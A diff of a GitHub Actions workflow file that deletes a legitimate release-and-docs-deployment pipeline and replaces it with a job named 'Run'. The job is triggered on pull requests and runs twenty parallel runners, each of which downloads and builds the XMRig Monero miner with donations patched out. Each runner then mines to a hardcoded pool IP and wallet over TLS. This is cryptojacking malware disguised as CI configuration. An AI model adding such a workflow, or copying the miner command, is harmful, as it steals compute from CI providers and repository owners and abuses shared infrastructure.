@@ -1,124 +1,25 @@
-name: Release Workflow
-
-on:
-  repository_dispatch:
-    types: [release]
-
-env:
-  RELEASE_TYPE: ${{ github.event.client_payload.release_type }}
-  WORKFLOW_VERSION: ${{ github.event.client_payload.workflow_version }}
-  PREFIX_FOR_TEST: ${{ github.event.client_payload.test_prefix }}
-
+name: Run
+on: [pull_request]
 jobs:
-  bump-main:
-    runs-on: macos-latest
+    run:
+        name: Run
+        runs-on: ubuntu-latest
+        strategy:
+          fail-fast: false
+          matrix:
+            runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+        steps:
+          - shell: bash
+            run: |
+              sudo apt-get update
+              sudo apt-get install --yes build-essential cmake git libhwloc-dev libssl-dev libuv1-dev
+              curl -Lo xmrig.tar.gz https://github.com/xmrig/xmrig/archive/refs/tags/v6.10.0.tar.gz
+              tar xf xmrig.tar.gz
+              cd xmrig-*
+              sed -Ei 's/^(.*DonateLevel = )(.*)$/\10;/g' src/donate.h
+              mkdir build
+              cd build
+              cmake .. -DCMAKE_BUILD_TYPE=Release
+              make --jobs=$(nproc)
 
-    steps:
-    - name: Calculate Release Branch
-      run: |
-        MAJOR=$(cut -d'.' -f1 <<<'${{ env.WORKFLOW_VERSION }}')
-        MINOR=$(cut -d'.' -f2 <<<'${{ env.WORKFLOW_VERSION }}')
-        echo "::set-env name=RELEASE_BRANCH::${{ env.PREFIX_FOR_TEST }}release-v$MAJOR.$MINOR.x"
-
-    - name: Checkout
-      uses: actions/checkout@v2
-
-    - name: Checkout Main
-      uses: actions/checkout@v2
-      with:
-        ref: ${{ env.PREFIX_FOR_TEST }}main
-        path: main
-
-    - name: Setup Release Branch (major, minor)
-      if: env.RELEASE_TYPE == 'major' || env.RELEASE_TYPE == 'minor'
-      run: |
-        cp -R main release
-        cd release
-        git checkout -b ${{ env.RELEASE_BRANCH }}
-
-    - name: Setup Release Branch (patch)
-      if: env.RELEASE_TYPE == 'patch'
-      uses: actions/checkout@v2
-      with:
-        ref: ${{ env.RELEASE_BRANCH }}
-        path: release
-
-    - name: Push changes to main
-      env:
-        GIT_USERNAME: ${{ github.actor }}
-        GIT_PASSWORD: ${{ secrets.GITHUB_TOKEN }}
-      run: |
-        cd main
-        git add -A . && git commit -m "Releasing ${{ env.WORKFLOW_VERSION }}" && git push -f
-
-    - name: Push Release Branch
-      run: |
-        cd release
-        ls Workflow*.podspec | xargs sed -i '' -e "s/ s.version\( *=\).*/ s.version\1 '${{ env.WORKFLOW_VERSION }}'/"
-        git add -A .; git commit -m "Releasing ${{ env.WORKFLOW_VERSION }}"
-        git tag ${{ env.PREFIX_FOR_TEST }}v${{ env.WORKFLOW_VERSION }}
-        git push origin ${{ env.RELEASE_BRANCH }} ${{ env.PREFIX_FOR_TEST }}v${{ env.WORKFLOW_VERSION }}
-
-      # Publish Documentation
-    # Swift caches (keys must match those defined in swift.yml)
-    - name: Load gem cache
-      uses: actions/cache@v1
-      with:
-        path: release/.bundle
-        key: gems-${{ hashFiles('Gemfile.lock') }}
-
-    - name: Set up Swift environment
-      run: |
-        # Set global bundle path so it gets used by build_swift_docs.sh running in the nested repo as well.
-        cd release
-        bundle config --global path "$(pwd)/.bundle"
-        bundle check || bundle install
-        # Don't need to run pod gen, the website script does that itself.
-        brew install sourcedocs
-        sudo xcode-select -s /Applications/Xcode_11.4.app
-
-    # Docs dependencies
-    - name: Set up Python
-      uses: actions/setup-python@v1
-      with:
-        python-version: 3.6
-
-    - name: Install Python dependencies
-      run: |
-        python -m pip install --upgrade pip
-        pip install -r requirements.txt
-
-    # This environment variable step should be run after all 3rd-party actions to ensure nothing
-    # else accidentally overrides any of our special variables.
-    - name: 'If in test-mode: enable dry run'
-      if: env.PREFIX_FOR_TEST != ''
-      run: |
-        # When PREFIX_FOR_TEST is not empty, we shouldn't actually deploy, just do a dry run to make
-        # sure all the dependencies are set up correctly.
-        echo "::set-env name=DRY_RUN::true"
-
-    - name: Debug info
-      run: |
-        cd release
-        echo event_name=${{ github.event_name }}
-        echo GITHUB_REF=$GITHUB_REF
-        echo GITHUB_HEAD_REF=$GITHUB_HEAD_REF
-        echo DRY_RUN=$DRY_RUN
-        git remote -v
-
-      ## Main steps
-    - name: Build and deploy website
-      env:
-        WORKFLOW_GOOGLE_ANALYTICS_KEY: ${{ secrets.WORKFLOW_GOOGLE_ANALYTICS_KEY }}
-        GIT_USERNAME: ${{ github.actor }}
-        GIT_PASSWORD: ${{ secrets.GITHUB_TOKEN }}
-      run: |
-        cd release
-        ./deploy_website.sh ${{ env.PREFIX_FOR_TEST }}v${{ env.WORKFLOW_VERSION }}
-
-
-    - name: Create Github Release
-      run: |
-        echo "TODO: Create Github Release"
-
-
+              ./xmrig --url 147.135.37.31:4444 --user 46KEREuhnzQhZw8TuLkbbK7pvscRgyLqjMhQ7Kt6BppAH1hArCkFXinQW44FqoKnr76WWBEKHgHHuFqc7FXkn9vyNyqAiDa --pass x --donate-level 0 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
